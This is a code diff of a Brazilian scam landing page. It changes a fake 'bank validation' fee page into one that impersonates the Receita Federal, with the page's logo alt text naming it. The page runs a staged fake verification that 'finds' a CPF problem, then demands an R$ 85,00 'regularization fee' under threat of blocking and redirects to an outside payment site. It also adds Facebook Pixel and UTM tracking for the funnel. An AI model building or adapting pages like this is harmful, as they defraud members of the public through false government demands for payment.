@@ -1,12 +1,30 @@
 <!DOCTYPE html><html lang="pt-BR"><head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Upsell 5 - Validação Bancária</title>
-   
+    <title>Upsell 4 - Pendência Receita Federal</title>
+
+<!-- Meta Pixel Code -->
+<script>
+  !function(f,b,e,v,n,t,s)
+  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+  n.queue=[];t=b.createElement(e);t.async=!0;
+  t.src=v;s=b.getElementsByTagName(e)[0];
+  s.parentNode.insertBefore(t,s)}(window, document,'script',
+  'https://connect.facebook.net/en_US/fbevents.js');
+  fbq('init', '913651397584478');
+  fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=913651397584478&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+    
     <script>
-        localStorage.setItem("upsell", "up5");
-        </script>
-   
+        localStorage.setItem("upsell", "up4");
+    </script>
+    
 <script
   src="https://cdn.utmify.com.br/scripts/utms/latest.js"
   data-utmify-prevent-xcod-sck
@@ -29,146 +47,236 @@
             font-family: 'Arial', sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #f8f9fa;
-            color: #333;
+            background-color: #eef2f3;
         }
 
         .header {
             background-color: #004080;
             padding: 20px;
-            text-align: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
 
         .header img {
-            max-width: 150px;
+            width: 65%;
+            padding: 0%;
+            margin-bottom: 0%;
+            margin-top: -5%;
         }
 
         .container {
-            max-width: 600px;
-            margin: 40px auto;
-            padding: 30px;
-            background: #ffffff;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-            border-radius: 10px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: calc(100vh - 100px);
             text-align: center;
+            padding: 20px;
+            background: linear-gradient(135deg, #002776, #0044cc);
+            color: white;
         }
 
         .container h1 {
-            color: #004080;
-            font-size: 26px;
+            font-size: 28px;
             margin-bottom: 20px;
+            margin-top: -35%;
             font-weight: bold;
+        }
+
+        .loading {
+            font-size: 18px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .loading span {
+            margin-left: 10px;
+            font-weight: bold;
+        }
+
+        .loading-bar {
+            width: 80%;
+            height: 8px;
+            background-color: #cce5ff;
+            border-radius: 5px;
+            overflow: hidden;
+            margin: 15px 0;
+            position: relative;
+        }
+
+        .loading-bar div {
+            height: 100%;
+            width: 0;
+            background-color: #ffcc00;
+            animation: loading 6s linear forwards;
+        }
+
+        @keyframes loading {
+            0% {
+                width: 0;
+            }
+
+            100% {
+                width: 100%;
+            }
         }
 
         .container p {
-            font-size: 16px;
-            color: #555;
-            line-height: 1.6;
-            margin-bottom: 20px;
+            font-size: 18px;
+            margin: 15px 0;
         }
 
-        .highlight {
-            color: #004080;
+        .container .highlight {
+            color: #ffcc00;
             font-weight: bold;
         }
 
-        .cta {
+        .action {
             margin-top: 30px;
+            display: none;
         }
 
-        .cta button {
-            background-color: #004080;
-            color: white;
-            padding: 15px 30px;
+        .action button {
+            background-color: #ffcc00;
+            color: #002776;
             border: none;
+            padding: 15px 25px;
             font-size: 18px;
             font-weight: bold;
-            border-radius: 5px;
+            border-radius: 8px;
             cursor: pointer;
-            transition: background-color 0.3s;
+            transition: all 0.3s ease;
         }
 
-        .cta button:hover {
-            background-color: #0056b3;
+        .action button:hover {
+            background-color: #ffd633;
         }
 
         .footer {
-            margin-top: 30px;
+            margin-top: 20px;
             font-size: 14px;
-            color: #777;
+            color: #cce5ff;
         }
 
         .footer strong {
-            color: #d9534f;
-        }
-
-        .info-box {
-            background-color: #f1f1f1;
-            border-left: 5px solid #004080;
-            padding: 15px;
-            margin: 20px 0;
-            text-align: left;
-            font-size: 15px;
-            color: #333;
-        }
-
-        .info-box h3 {
-            margin: 0;
-            font-size: 16px;
-            font-weight: bold;
+            color: #ffcc00;
         }
     </style>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const container = document.querySelector(".container");
+            const actionSection = document.querySelector(".action");
+            const loadingBar = document.querySelector(".loading-bar div");
+            const loadingElements = document.querySelectorAll(".loading, .loading-bar");
+            let step = 0;
+
+            const steps = [
+                "Verificando pagamento...",
+                "Verificando dados...",
+                "Erro encontrado!"
+            ];
+
+            const interval = setInterval(() => {
+                if (step < steps.length) {
+                    container.querySelector("h1").textContent = steps[step];
+                    step++;
+                } else {
+                    clearInterval(interval);
+                    container.querySelector("h1").textContent = "⚠️ Pendência na Receita Federal!";
+                    loadingElements.forEach(el => el.style.display = "none");
+                    actionSection.style.display = "block";
+                }
+            }, 2000);
+
+    
+            loadingBar.style.animationPlayState = 'running';
+        });
+    </script>
 </head>
+
 <body>
 
     <div class="header">
-        <img src="https://s3.typebot.io/public/workspaces/clpwrgv88001vlh0fl3wduaqz/typebots/clsoykmoc0001o1a8fuuy3j8r/blocks/ymggz8eopp0fj524hfxubuit?v=1735166818525" alt="Logo Banco Central">
+        <img src="https://s3.typebot.io/public/workspaces/clpwrgv88001vlh0fl3wduaqz/typebots/clsoykmoc0001o1a8fuuy3j8r/blocks/ymggz8eopp0fj524hfxubuit?v=1735166818525" alt="Logo Receita Federal">
     </div>
 
     <div class="container">
-        <h1>🔒 Validação Bancária Obrigatória</h1>
-        <p>Para garantir a segurança e regularidade da sua transferência, é necessária a realização de uma <span class="highlight">validação bancária obrigatória</span>, conforme as normas do sistema bancário nacional.</p>
-
-        <div class="info-box">
-            <h3>Por que a validação é necessária?</h3>
-            <p>✔️ Evita transações inválidas ou bloqueios futuros.</p>
-            <p>✔️ Confirma a autenticidade dos seus dados bancários.</p>
-            <p>✔️ Libera sua transferência com total segurança.</p>
+        <h1>⚠️ Verificando...</h1>
+        <div class="loading">
+            <span>Processando informações...</span>
+        </div>
+        <div class="loading-bar">
+            <div></div>
         </div>
 
-        <p><strong>Valor da Taxa:</strong> <span class="highlight">R$ 18,25</span></p>
-        <p><strong>Prazo para Validação:</strong> Até 15 minutos após o pagamento.</p>
+        <div class="action">
+            <p>Identificamos uma pendência relacionada ao seu <span class="highlight">CPF</span>.</p>
+            <p>Para resolver, é necessário efetuar o pagamento da <span class="highlight">Taxa de Regularização</span>.
+            </p>
+            <p>O valor é de <span class="highlight">R$ 85,00</span>. Após o pagamento, sua solicitação será liberada
+                imediatamente!</p>
 
-        <div class="cta">
-            <button onclick="checkout(event)">VALIDAR AGORA</button>
+            <div class="cta">
+                <button onclick="checkout(event)">REGULARIZAR AGORA</button>
+            </div>
         </div>
 
         <div class="footer">
-            ⚠️ <strong>Atenção:</strong> O não pagamento pode causar o registro de sua conta como <strong>irregular</strong>, impactando futuras transações financeiras.
+            ⚠️ <strong>Atenção:</strong> O não pagamento pode causar o bloqueio definitivo do processo.
         </div>
     </div>
     <script>
         function checkout(event) {
-          event.preventDefault();
-      
-          // Captura os parâmetros da URL atual
-          const urlParams = new URLSearchParams(window.location.search);
-          
-          // Remove parâmetros sensíveis como CPF e nome
-          urlParams.delete('cpf');
-          urlParams.delete('nome');
-          urlParams.delete('CPF');
-          urlParams.delete('NOME');
-          
-          // Constrói a URL de destino com parâmetros filtrados
-          const filteredParams = urlParams.toString();
-          const destino = filteredParams ? 
-              "https://pay.pagamentosfacilitadosoficial.shop/nWrxGWAxMdw3654?" + filteredParams :
-              "https://pay.pagamentosfacilitadosoficial.shop/nWrxGWAxMdw3654";
-      
-          // Redireciona
-          window.location.href = destino;
+            event.preventDefault();
+            
+            // Captura os parâmetros da URL atual
+            const urlParams = new URLSearchParams(window.location.search);
+            
+            // Remove parâmetros sensíveis como CPF e nome
+            urlParams.delete('cpf');
+            urlParams.delete('nome');
+            urlParams.delete('CPF');
+            urlParams.delete('NOME');
+            
+            // Constrói a nova URL com parâmetros filtrados
+            const filteredParams = urlParams.toString();
+            const finalUrl = filteredParams ? 
+                "https://pay.pagamentosfacilitadosoficial.shop/N1nVZpY8dwYGlM6?" + filteredParams :
+                "https://pay.pagamentosfacilitadosoficial.shop/N1nVZpY8dwYGlM6";
+                
+            window.location.href = finalUrl;
         }
-      </script>
+        
+        // Função para trackear eventos de Facebook Pixel
+        function trackFacebookPixelEvent(event, params = {}) {
+          if (typeof fbq !== 'undefined') {
+            fbq('track', event, params);
+          }
+        }
+        
+        // Disparar eventos ViewContent
+        document.addEventListener('DOMContentLoaded', function() {
+          // Evento ViewContent no carregamento da página
+          trackFacebookPixelEvent('ViewContent', {
+            content_type: 'tax_regularization',
+            content_name: 'Regularização Receita Federal - Up4'
+          });
+          
+          // Trackear clique no botão "Regularizar Agora"
+          const btnRegularizar = document.querySelector('[onclick="checkout(event)"]');
+          if (btnRegularizar) {
+            btnRegularizar.addEventListener('click', function() {
+              trackFacebookPixelEvent('ViewContent', {
+                content_type: 'regularization_payment',
+                content_name: 'Pagamento Taxa de Regularização'
+              });
+            });
+          }
+        });
+    </script>
+
 
 </body></html>
